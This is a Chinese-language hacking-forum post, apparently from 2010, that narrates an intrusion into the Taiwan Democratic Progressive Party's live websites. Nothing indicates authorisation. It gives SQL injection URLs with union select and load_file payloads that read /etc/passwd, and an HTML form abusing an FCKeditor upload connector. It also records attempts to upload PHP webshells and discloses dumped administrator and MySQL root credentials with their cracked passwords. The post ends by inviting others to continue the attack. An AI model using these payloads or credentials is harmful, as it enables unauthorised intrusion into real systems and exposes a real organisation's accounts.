@@ -1,0 +1,324 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+台湾民进党渗透测试报告
+D8888D主贴内容-------------------------------------------------------
+ 
+
+测试目标 [url=http://www.dpp.org.tw]链接标记http://www.dpp.org.tw[/url]   台湾民进党
+作者：喝茶的猪
+QQ 97044007
+
+搜集一些基本信息
+在地址后面逐一添加info.php  phpinfo.php  test.php 找到 php统计配置信息
+[url=http://www.dpp.org.tw/test.php]链接标记http://www.dpp.org.tw/test.php[/url] 
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623082fae298068f47d23.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk3OXw3MGFiZWNlYnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (112.07 KB)
+
+2010-4-6 23:08
+
+System  Linux [url=http://www.dpp.org.tw]链接标记www.dpp.org.tw[/url] 2.6.27.25-78.2.56.fc9.i686 #1 SMP Thu Jun 18 12:47:50 EDT 2009 i686  
+Apache Version  Apache/2.2.9 (Fedora)  
+Mysql   version  5.0.77  
+网站绝对路径为 /home/html/www
+IP地址为 210.202.78.41
+服务器 22  3306 5900  均不对外开放
+
+找到后台登陆页面
+[url=http://www.dpp.org.tw/system/]链接标记http://www.dpp.org.tw/system/[/url]   
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062308a68a71bbb92709ed.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4MHwyY2ZiN2I2Y3wxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (25.59 KB)
+
+2010-4-6 23:08
+
+    在[url=http://www.Google.com]链接标记www.Google.com[/url] 搜索   site:dpp.org.tw inurl:php  
+    尝试用啊D查找注入点
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062308146d87349eddf111.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4MXwyMTA0YTZmM3wxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (166.17 KB)
+
+2010-4-6 23:08
+啊D未检测到任何注入漏洞
+
+
+手工检测找到了一个数据库调用链接地址 如下
+[url=http://www.dpp.org.tw/news_content.php?kw=&menu_sn=7&sub_menu=44&sn=3575]链接标记http://www.dpp.org.tw/news_conte ... menu=44&sn=3575[/url]
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062308453f629e8f03a51f.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4MnxhNTYxMTEyYXwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (43.86 KB)
+
+2010-4-6 23:08
+
+  在&sn=3575后面加 -0 返回正常 ，
+加-1 返回了另一个页面 
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/100406230810838f49fd999c99.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4M3xmYzhmODBiYnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (41.35 KB)
+
+2010-4-6 23:08
+
+因此判断存在注入漏洞，用order by 爆字段长度为11
+[url=http://www.dpp.org.tw/news_content.php?kw=&menu_sn=7&sub_menu=44&sn=3575%20order%20by%2011]链接标记http://www.dpp.org.tw/news_conte ... 5%20order%20by%2011[/url]
+
+[url=http://www.dpp.org.tw/news_content.php?kw=&menu_sn=7&sub_menu=44&sn=3575%20union%20select%201]链接标记http://www.dpp.org.tw/news_conte ... 0union%20select%201[/url],2,3,4,5,6,7,8,9,10,11
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062308df34714d53034153.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4NHwyNzEwMThiNnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (39.5 KB)
+
+2010-4-6 23:08
+
+没有爆出数据，网站做了严密的过滤。
+测试了其它地址，均不能进行注入利用。
+
+
+在Google 查到的所有地址里，发现了Fckeditor目录！
+[url=http://www.dpp.org.tw/fckeditor/]链接标记http://www.dpp.org.tw/fckeditor/[/url]   
+[url=http://www.dpp.org.tw/FCKeditor/editor/filemanager/upload/php/]链接标记http://www.dpp.org.tw/FCKeditor/editor/filemanager/upload/php/[/url]
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/100406230877aba4b01396125f.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4NXwwNmQxMDljZHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (40.14 KB)
+
+2010-4-6 23:08
+列出Fckeditor目录的文件。
+找到 [url=http://www.dpp.org.tw/FCKeditor/editor/filemanager/upload/test.html]链接标记http://www.dpp.org.tw/FCKeditor/ ... er/upload/test.html[/url] 这个上传页面，
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623086222b9492a6c3f85.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4NnxiZTFlMWE3NXwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (28.81 KB)
+
+2010-4-6 23:08
+connectors选择php,后面两个可以不动。上传英文或数字名称的php或asp马得shell，很是简单。
+上传的马一般不改名，遇同名马则改成数组式，故建议不要用中文名。
+马的路径直接在下方空白处查看源文件。
+File Uploader 选择php，点浏览 选中一个PHP一句话木马。
+然后Send it to the server上传。
+---没有成功。
+
+
+
+
+在一个漏洞发布网站上搜索Fckeditor爆出的漏洞，并逐一测试。
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623087dbb927f2a309d7b.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4N3w3YTAwZDU5YXwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (34.86 KB)
+
+2010-4-6 23:08
+选了一个上传漏洞进行本地提交。
+/editors/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/
+本地提交代码如下：
+
+<form id="frmUpload" enctype="multipart/form-data" action="http://www.dpp.org.tw/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/" method="post">
+Upload a new file:<br>
+<input type="file" name="NewFile" size="50"><br>
+<input id="btnUpload" type="submit" value="Upload">
+</form> 
+
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/100406230930d281681d5b1f99.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4OHw1MTRhMWU3ZHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (37.86 KB)
+
+2010-4-6 23:09
+
+测试了公布在网站上的漏洞，依然未能成功。
+
+
+
+
+在子网站 [url=http://caucus.dpp.org.tw/]链接标记http://caucus.dpp.org.tw/[/url] 上发现了一个发布消息的版块。
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/100406230985e486e17a470066.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk4OXw0NDdlOTU0NHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (145.28 KB)
+
+2010-4-6 23:09
+
+点开一个消息，却不是一个数据库调用地址。
+
+[url=http://caucus.dpp.org.tw/notice_content.php]链接标记http://caucus.dpp.org.tw/notice_content.php[/url]
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062309e19aa4beff818282.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5MHxmMDQ5Mjg1MXwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (59.29 KB)
+
+2010-4-6 23:09
+点开其他消息，均是同样的地址页面 [url=http://caucus.dpp.org.tw/notice_content.php]链接标记http://caucus.dpp.org.tw/notice_content.php[/url]
+于是打开WSockExpert 进行抓包，如下。
+
+POST /notice_content.php HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, application/vnd.ms-excel, */*
+
+type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=192
+
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062309d6e9ad89fa03fa65.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5MXwzMGZkYjRjZXwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (45.96 KB)
+
+2010-4-6 23:09
+
+
+得到了消息的数据库调用地址如下
+[url=http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=192]链接标记http://caucus.dpp.org.tw/notice_ ... _sn=&new_id=192[/url]
+经测试此地址存在注入漏洞！
+
+[url=http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=192%20order%20by%207]链接标记http://caucus.dpp.org.tw/notice_ ... 92%20order%20by%207[/url]
+爆出字段长度为7
+
+[url=http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=-192%20union%20select%201]链接标记http://caucus.dpp.org.tw/notice_ ... 0union%20select%201[/url],2,3,4,5,6,7
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623091dabffca37a97266.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5Mnw0YjViZjdhNnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (8.98 KB)
+
+2010-4-6 23:09
+
+利用load_file 函数读出了 /etc/passwd 数据
+[url=http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=-192+union+select+1]链接标记http://caucus.dpp.org.tw/notice_ ... -192+union+select+1[/url],2,load_file(0x2F6574632F706173737764),4,5,6,7
+
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623097a63b3c3ddd1b722.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5M3xkZmRjODI1NHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (259.36 KB)
+
+2010-4-6 23:09
+
+[url=http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=-192+union+select+1]链接标记http://caucus.dpp.org.tw/notice_ ... -192+union+select+1[/url],2,concat(cname,0x7C,pwd),user(),5,6,7%20from%20admin
+
+成功读出了管理名和密码为
+Admin| crito
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623099924f568e09504eb.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5NHxkYTU0YjhkNHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (45.26 KB)
+
+2010-4-6 23:09
+
+
+找到[url=http://caucus.dpp.org.tw/]链接标记http://caucus.dpp.org.tw/[/url] 子网站的后台地址为 [url=http://caucus.dpp.org.tw/system/]链接标记http://caucus.dpp.org.tw/system/[/url]
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623092d645e43d8204740.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5NXwyZTBlOWNhN3wxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (28.24 KB)
+
+2010-4-6 23:09
+
+用 Admin| crito 进入后台 上传文件。
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/100406230925b507e37d648bc6.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5NnxlZWY2MGY2ZnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (46.02 KB)
+
+2010-4-6 23:09
+
+
+上传一个php一句话后，却不能解析。
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/100406230994e34aa8100edd9c.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5N3w4YTJmMWU1YnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (5.77 KB)
+
+2010-4-6 23:09
+
+上传了py  pl 等脚本，均不能解析。 如图！
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623109bcd034305c0f3b7.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5OHw2ZDEyNmVkMXwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (36.43 KB)
+
+2010-4-6 23:10
+
+[url=http://caucus.dpp.org.tw/]链接标记http://caucus.dpp.org.tw/[/url]  子网站与主站调用的不是同一个数据库。
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062310e7d6bb72d57e72d0.png[/img][url=http://www.t00ls.net/attachment.php?aid=NDk5OXxlZjM5YWZiMHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (3.3 KB)
+
+2010-4-6 23:10
+
+
+[url=http://caucus.dpp.org.tw/]链接标记http://caucus.dpp.org.tw/[/url] 子网站调用的Mysql数据库 安装在在内网的一台Linux 服务器上,如图。
+与网站服务器分离。
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623101a61b54fcb008ccc.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwMHw4ZTNlNDg4NnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (2.85 KB)
+
+2010-4-6 23:10
+
+[url=http://caucus.dpp.org.tw/notice_content.php?type_id=&only_id=&frompage=notice.php&frompageid=&l_out=&gjz=&act=&edit_sn=&new_id=-192+union+select+1]链接标记http://caucus.dpp.org.tw/notice_ ... -192+union+select+1[/url],2,concat(user,0x7C,password),4,5,6,7%20from%20mysql.user
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623106f035955814b626f.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwMXw3MWM2MzZlYXwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (38.23 KB)
+
+2010-4-6 23:10
+
+读出 Mysql 的root 密码   root  534f83d01d8a4da6
+
+彩虹表破解后为 s1020
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062310f276c969c205ad1c.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwMnw3YjBjNjkzOHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (4.29 KB)
+
+2010-4-6 23:10
+
+再次打开主站，寻找漏洞。
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062310f4bec019fec2b01b.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwM3w4M2IzYjdkZHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (7.78 KB)
+
+2010-4-6 23:10
+
+原来网站有多语言版本，于是选"日本语"点进去浏览。[url=http://www.dpp.org.tw/index_en/]链接标记http://www.dpp.org.tw/index_en/[/url]
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/100406231045713a7c543c267b.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwNHw4OTY3YjZkZnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (41.46 KB)
+
+2010-4-6 23:10
+
+页面中有这样一个滚动的消息发布模块，眼前一亮。
+于是点进去WSockExpert 抓包看数据库调用地址。如下！
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623105046f70593e5da04.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwNXxkMGNkMzFlNHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (5.83 KB)
+
+2010-4-6 23:10
+
+
+[url=http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260&ad_type=&act=]链接标记http://www.dpp.org.tw/index_en/n ... p;ad_type=&act=[/url]
+
+[url=http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260-0&ad_type=&act=]链接标记http://www.dpp.org.tw/index_en/n ... p;ad_type=&act=[/url]  返回正常
+[url=http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260-1&ad_type=&act=]链接标记http://www.dpp.org.tw/index_en/n ... p;ad_type=&act=[/url]  返回另一个页面
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062311ff2bff392ca6a5bd.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwNnxiZTNkZTY3ZnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (41.37 KB)
+
+2010-4-6 23:11
+
+判断存在注入漏洞。
+[url=http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260%20order%20by%2011&ad_type=&act=]链接标记http://www.dpp.org.tw/index_en/n ... p;ad_type=&act=[/url]   爆出字段为11
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062311c3008d419e413847.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwN3w0ZmNmYTVjM3wxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (34.33 KB)
+
+2010-4-6 23:11
+
+[url=http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260%20and%201=2%20union%20select%201]链接标记http://www.dpp.org.tw/index_en/n ... 0union%20select%201[/url],2,3,4,5,6,7,8,9,10,11&ad_type=&act=
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623112d99de21bd9484e5.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwOHwxNjUwODMzNnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (50.95 KB)
+
+2010-4-6 23:11
+
+and (select count(*) from mysql.user)>0  查看数据库权限。
+[url=http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=47&show_title=&sn=4255%20and%20]链接标记http://www.dpp.org.tw/index_en/n ... mp;sn=4255%20and%20[/url](select%20count(*)%20from%20mysql.user)>0&ad_type=&act=  返回错误，没有读写权限。
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062311eb1b6c1ebe58feb0.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAwOXw4NmVhMTIyZnwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (28.85 KB)
+
+2010-4-6 23:11
+
+
+[url=http://www.dpp.org.tw/index_en/news_content.php?kw=&menu_sn=&sub_menu=48&show_title=&sn=4260%20and%201=2%20union%20select%201]链接标记http://www.dpp.org.tw/index_en/n ... 0union%20select%201[/url],2,concat(cname,0x7C,pwd),4,5,6,7,8,9,10,11%20from%20admin&ad_type=&act=
+爆出管理账号 密码 分别为    網站管理人員     duser0729
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/10040623112fbb8b8ed11424f3.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAxMHw2NzI4MDA0ZHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (36.91 KB)
+
+2010-4-6 23:11
+
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062311b0bc67a71f63b47d.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAxMXw0YTAxZTNkMHwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (3.48 KB)
+
+2010-4-6 23:11
+
+[url=http://www.dpp.org.tw/system/]链接标记http://www.dpp.org.tw/system/[/url]
+进行后台登陆，却提示账号密码错误。
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1004/1004062311dce67c344d54b489.png[/img][url=http://www.t00ls.net/attachment.php?aid=NTAxMnw2ZDE4NTQ4YXwxMjg2NDgxNzY4fDEyMGR0ZE5kZGk2Q2NJTGEvVUF4T0d4TmRXNFdDeU5QZ2RVSkJoNWNOOFJOOXRz&nothumb=yes]链接标记下载[/url] (30.72 KB)
+
+2010-4-6 23:11
+
+注入点把/index_en 目录去掉
+and ord(mid(version(),1,1))>51 判断版本
+[url=http://www.dpp.org.tw/news_content.php?kw=&menu_sn=&sub_menu=47&show_title=&sn=4255]链接标记http://www.dpp.org.tw/news_conte ... _title=&sn=4255[/url] and ord(mid(version(),1,1))>51&ad_type=&act=
+返回错误，是4.0一下版本。   怀疑主站调用了多个数据库，一个5.0 一个4.0一下。
+4.0一下不支持union 联合注入，也就怪不得 [url=http://www.dpp.org.tw/news_content.php?kw=&menu_sn=7&sub_menu=44&sn=3575]链接标记http://www.dpp.org.tw/news_conte ... menu=44&sn=3575[/url] 此注入点无法爆出数据了。
+到最后也只是进了后台，由于网站被多次搞过，所以管理比较重视安全了。
+就写到这里，还请大牛继续渗透。
